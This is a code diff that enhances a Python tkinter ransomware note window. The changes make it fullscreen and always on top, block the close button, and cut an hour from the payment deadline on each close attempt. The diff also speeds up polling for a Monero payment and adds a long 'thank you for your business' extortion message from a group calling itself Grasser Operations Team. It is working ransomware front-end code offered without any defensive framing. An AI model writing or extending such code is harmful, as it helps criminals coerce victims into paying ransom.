@@ -23,12 +23,29 @@ class RansomNoteGUI:
         # Deadline: 24 hours
         self.deadline = datetime.now() + timedelta(hours=24)
         self.time_remaining = self.deadline - datetime.now()
+        self.close_attempts = 0
+        self.timer_id = None  # Store timer ID for cancellation
         
         # Create main window
         self.root = tk.Tk()
         self.root.title(">>> SYSTEM SECURITY ALERT <<<")
-        self.root.geometry("1000x700")
+        
+        # Get screen size and set window size responsively
+        self.screen_width = self.root.winfo_screenwidth()
+        self.screen_height = self.root.winfo_screenheight()
+        
+        # Use 90% of screen for window, max 1000x700
+        window_width = min(int(self.screen_width * 0.9), 1000)
+        window_height = min(int(self.screen_height * 0.9), 700)
+        
+        self.root.geometry(f"{window_width}x{window_height}")
         self.root.attributes('-topmost', True)
+        
+        # Fullscreen mode
+        self.root.state('zoomed')  # Windows fullscreen
+        
+        # Prevent window closing - intercept close button
+        self.root.protocol("WM_DELETE_WINDOW", self.on_close_attempt)
         
         # Set colors
         self.bg_color = "#0a0e27"
@@ -47,21 +64,42 @@ class RansomNoteGUI:
     def build_ui(self):
         """Build the GUI elements"""
         
+        # Calculate responsive padding based on screen size
+        small_screen = self.screen_height < 768
+        if small_screen:
+            header_pady = 8
+            info_pady = 8
+            info_padx = 15
+            status_pady = 5
+            button_pady = 5
+            message_font_size = 10
+            timer_font_size = 22
+            subtitle_font_size = 11
+        else:
+            header_pady = 15
+            info_pady = 15
+            info_padx = 20
+            status_pady = 10
+            button_pady = 10
+            message_font_size = 12
+            timer_font_size = 26
+            subtitle_font_size = 13
+        
         # Top header bar
-        header = tk.Frame(self.root, bg=self.accent_color, height=60)
+        header = tk.Frame(self.root, bg=self.accent_color, height=50 if small_screen else 60)
         header.pack(fill=tk.X, padx=0, pady=0)
         header.pack_propagate(False)
         
-        title_font = tkFont.Font(family="Courier New", size=16, weight="bold")
+        title_font = tkFont.Font(family="Courier New", size=14 if small_screen else 16, weight="bold")
         title = tk.Label(header, text="⚠ SYSTEM COMPROMISED ⚠", 
                         font=title_font, bg=self.accent_color, fg="white")
-        title.pack(pady=10)
+        title.pack(pady=header_pady)
         
         # Info frame with timer and subtitle (NON-SCROLLABLE)
         info_frame = tk.Frame(self.root, bg=self.bg_color)
-        info_frame.pack(fill=tk.X, padx=20, pady=15)
+        info_frame.pack(fill=tk.X, padx=info_padx, pady=info_pady)
         
-        subtitle_font = tkFont.Font(family="Courier New", size=13, weight="bold")
+        subtitle_font = tkFont.Font(family="Courier New", size=subtitle_font_size, weight="bold")
         subtitle = tk.Label(info_frame, 
                            text="YOUR FILES HAVE BEEN ENCRYPTED", 
                            font=subtitle_font, 
@@ -70,13 +108,13 @@ class RansomNoteGUI:
         subtitle.pack()
         
         # Timer display
-        timer_font = tkFont.Font(family="Courier New", size=26, weight="bold")
+        timer_font = tkFont.Font(family="Courier New", size=timer_font_size, weight="bold")
         self.timer_label = tk.Label(info_frame, 
                                    text="24:00:00", 
                                    font=timer_font, 
                                    fg=self.secondary_color, 
                                    bg=self.bg_color)
-        self.timer_label.pack(pady=10)
+        self.timer_label.pack(pady=5 if small_screen else 10)
         
         # Main content frame (scrollable)
         main_frame = tk.Frame(self.root, bg=self.bg_color)
@@ -87,7 +125,7 @@ class RansomNoteGUI:
         scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
         
         # Create text widget with scrollbar
-        message_font = tkFont.Font(family="Courier New", size=12, weight="normal")
+        message_font = tkFont.Font(family="Courier New", size=message_font_size, weight="normal")
         self.message_text = tk.Text(main_frame, 
                                    wrap=tk.WORD, 
                                    bg=self.bg_color, 
@@ -95,8 +133,8 @@ class RansomNoteGUI:
                                    font=message_font,
                                    yscrollcommand=scrollbar.set,
                                    relief=tk.FLAT,
-                                   padx=20,
-                                   pady=20)
+                                   padx=15 if small_screen else 20,
+                                   pady=10 if small_screen else 15)
         self.message_text.pack(side=tk.LEFT, fill=tk.BOTH, expand=True)
         scrollbar.config(command=self.message_text.yview)
         
@@ -215,6 +253,10 @@ Decryption Method:    Automatic, instantaneous delivery
 
 This is professional-grade encryption. Not some script kiddie nonsense.
 
+NOTE: This window cannot be closed. Attempting to close it will subtract
+1 hour from your deadline for each attempt. Don't waste your time - focus
+on acquiring Monero instead.
+
 ═══════════════════════════════════════════════════════════════════
 
 TIMELINE:
@@ -284,12 +326,13 @@ Wallet: {self.monero_address}
         self.message_text.tag_configure("center", justify=tk.CENTER)
         self.message_text.tag_add("center", "1.0", "end")
         
-        # Status frame
-        status_frame = tk.Frame(self.root, bg=self.bg_color, height=80)
-        status_frame.pack(fill=tk.X, padx=20, pady=10)
+        # Status frame (responsive height)
+        status_height = 70 if small_screen else 80
+        status_frame = tk.Frame(self.root, bg=self.bg_color, height=status_height)
+        status_frame.pack(fill=tk.X, padx=info_padx, pady=status_pady)
         status_frame.pack_propagate(False)
         
-        status_font = tkFont.Font(family="Courier New", size=9)
+        status_font = tkFont.Font(family="Courier New", size=8 if small_screen else 9)
         
         # Status text
         self.status_text = tk.Label(status_frame,
@@ -307,11 +350,13 @@ Wallet: {self.monero_address}
                                          fg="#00ff00",
                                          bg=self.bg_color)
         
-        # Bottom buttons
+        # Bottom buttons (responsive)
         button_frame = tk.Frame(self.root, bg=self.bg_color)
-        button_frame.pack(fill=tk.X, padx=20, pady=10)
+        button_frame.pack(fill=tk.X, padx=info_padx, pady=button_pady)
         
-        button_font = tkFont.Font(family="Courier New", size=10, weight="bold")
+        button_font = tkFont.Font(family="Courier New", size=9 if small_screen else 10, weight="bold")
+        button_padx = 15 if small_screen else 20
+        button_pady_val = 7 if small_screen else 10
         
         # Close button
         close_btn = tk.Button(button_frame, 
@@ -320,8 +365,8 @@ Wallet: {self.monero_address}
                             bg=self.accent_color, 
                             fg="white",
                             font=button_font,
-                            padx=20, 
-                            pady=10,
+                            padx=button_padx, 
+                            pady=button_pady_val,
                             relief=tk.FLAT,
                             cursor="hand2")
         close_btn.pack(side=tk.RIGHT, padx=5)
@@ -333,24 +378,24 @@ Wallet: {self.monero_address}
                            bg=self.secondary_color, 
                            fg="black",
                            font=button_font,
-                           padx=20, 
-                           pady=10,
+                           padx=button_padx, 
+                           pady=button_pady_val,
                            relief=tk.FLAT,
                            cursor="hand2")
         copy_btn.pack(side=tk.RIGHT, padx=5)
         
         # Copy ID button
-        id_btn = tk.Button(button_frame, 
-                         text="COPY PAYMENT ID", 
-                         command=self.copy_id,
-                         bg=self.secondary_color, 
-                         fg="black",
-                         font=button_font,
-                         padx=20, 
-                         pady=10,
-                         relief=tk.FLAT,
-                         cursor="hand2")
-        id_btn.pack(side=tk.RIGHT, padx=5)
+        copy_id_btn = tk.Button(button_frame, 
+                              text="COPY ID", 
+                              command=self.copy_id,
+                              bg=self.secondary_color, 
+                              fg="black",
+                              font=button_font,
+                              padx=button_padx, 
+                              pady=button_pady_val,
+                              relief=tk.FLAT,
+                              cursor="hand2")
+        copy_id_btn.pack(side=tk.RIGHT, padx=5)
     
     def schedule_timer_update(self):
         """Schedule timer update in main thread using after()"""
@@ -376,32 +421,160 @@ Wallet: {self.monero_address}
         elif hours == 0 and minutes < 10:
             self.timer_label.config(fg="#ff0000")
         
-        # Check payment status every 30 seconds
-        if int(seconds) == 0 and int(minutes) % 1 == 0:
+        # Check payment status every 5 seconds (more responsive)
+        if int(seconds) % 5 == 0:
             if self.payment_check_callback:
                 try:
                     if self.payment_check_callback():
                         self.show_payment_received()
                         return
-                except:
+                except Exception as e:
                     pass
         
         # Schedule next update in 1 second
-        self.root.after(1000, self.schedule_timer_update)
+        self.timer_id = self.root.after(1000, self.schedule_timer_update)
     
     def update_timer(self):
         """Legacy method - not used anymore (kept for compatibility)"""
         pass
     
     def show_payment_received(self):
-        """Show payment received message"""
+        """Show payment received message and stop timer"""
         self.timer_label.config(text="PAYMENT RECEIVED!", fg="#00ff00")
+        self.root.attributes('-topmost', False)  # Allow window to be moved
         try:
             self.payment_indicator.pack(anchor=tk.W, pady=10)
         except:
             pass
         self.status_text.config(text="Payment confirmed - decryption key deployed", 
                                fg="#00ff00")
+        
+        # Update message text with thank you message
+        self.message_text.config(state=tk.NORMAL)
+        self.message_text.delete(1.0, tk.END)
+        
+        thank_you_text = f"""
+╔═══════════════════════════════════════════════════════════════════╗
+║                        BUSINESS COMPLETED                         ║
+║                     GRASSER OPERATIONS TEAM                       ║
+╚═══════════════════════════════════════════════════════════════════╝
+
+PAYMENT CONFIRMED
+
+Payment ID: {self.ransom_id}
+Amount Received: 0.1 XMR
+Confirmation Status: VERIFIED
+Decryption Status: ACTIVE
+
+═══════════════════════════════════════════════════════════════════
+
+THANK YOU FOR YOUR BUSINESS
+
+We appreciate your swift action and cooperation in resolving this matter.
+Professional organizations understand that some losses are inevitable.
+You have handled this professionally. We respect that.
+
+Your files are now being decrypted. The decryption process typically
+completes within 1-2 minutes. Monitor your system for file restoration.
+
+═══════════════════════════════════════════════════════════════════
+
+DECRYPTION KEY
+
+Your master decryption key has been generated and is being deployed to
+your system. You will find the decryption utility on your Desktop.
+
+Usage:
+1. Run the decryption tool
+2. Provide your Payment ID when prompted
+3. Your files will be restored automatically
+
+═══════════════════════════════════════════════════════════════════
+
+WHAT'S NEXT?
+
+Your files are being restored to their original state. This process is
+irreversible and cannot be intercepted. All encrypted copies will be
+securely deleted from our servers within 48 hours.
+
+You now have the opportunity to:
+
+1. Patch the security vulnerability that allowed our access
+2. Implement proper network segmentation and monitoring
+3. Deploy endpoint detection and response (EDR) solutions
+4. Consider professional security audit services
+
+This was a learning opportunity. Don't waste it.
+
+═══════════════════════════════════════════════════════════════════
+
+A PROFESSIONAL NOTE
+
+We operate on principles:
+
+✓ We decrypt all paying customers - always
+✓ We delete all victim data after payment - always
+✓ We do not return to previously encrypted customers
+✓ We maintain strict operational security standards
+✓ We only target organizations with significant security gaps
+
+This is not personal. This is business. And in business, we keep our word.
+
+═══════════════════════════════════════════════════════════════════
+
+OPERATIONAL SECURITY ADVISORY
+
+To prevent future incidents:
+
+• Review your current security posture
+• Segment critical systems from public-facing networks
+• Implement multi-factor authentication on all administrative accounts
+• Deploy network monitoring and intrusion detection
+• Maintain regular security audits and penetration tests
+• Train employees on phishing and social engineering tactics
+
+Professional security is an investment, not a cost.
+
+═══════════════════════════════════════════════════════════════════
+
+FINAL WORDS
+
+We were impressed by your organization's response to this situation.
+Quick action under pressure demonstrates professional maturity.
+
+We have no interest in returning to your network. Our business model
+depends on moving forward, not backward. Your future is secure.
+
+Consider this an expensive but valuable security consultation.
+
+Most organizations never know how vulnerable they are until it's too late.
+You are fortunate to have learned this lesson and survived it.
+
+Use this knowledge wisely.
+
+═══════════════════════════════════════════════════════════════════
+
+Decryption initiated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
+Expected completion: Within 2 minutes
+
+                              - GRASSER OPERATIONS TEAM
+                         "Professional Security Solutions"
+
+═══════════════════════════════════════════════════════════════════
+"""
+        
+        self.message_text.insert(1.0, thank_you_text)
+        self.message_text.config(state=tk.DISABLED)
+        
+        # Center align the text
+        self.message_text.tag_configure("center", justify=tk.CENTER)
+        self.message_text.tag_add("center", "1.0", "end")
+        
+        # Cancel all scheduled timer updates
+        try:
+            self.root.after_cancel(self.timer_id)
+        except:
+            pass
     
     def copy_wallet(self):
         """Copy wallet address to clipboard"""
@@ -429,6 +602,20 @@ Wallet: {self.monero_address}
     def run(self):
         """Run the GUI"""
         self.root.mainloop()
+    
+    def on_close_attempt(self):
+        """Handle close button attempts - subtract 1 hour from deadline"""
+        self.close_attempts += 1
+        self.deadline = self.deadline - timedelta(hours=1)
+        
+        # Show warning message
+        warning = f"Nice try! Close attempt #{self.close_attempts}\n\nYou just lost 1 hour!\nNew deadline: {self.deadline.strftime('%Y-%m-%d %H:%M:%S')}"
+        
+        # Update status
+        self.status_text.config(text=f"[CLOSE ATTEMPT #{self.close_attempts}] 1 hour subtracted from deadline!")
+        
+        # Don't actually close - just ignore the event
+        pass
     
     def destroy(self):
         """Destroy the window"""
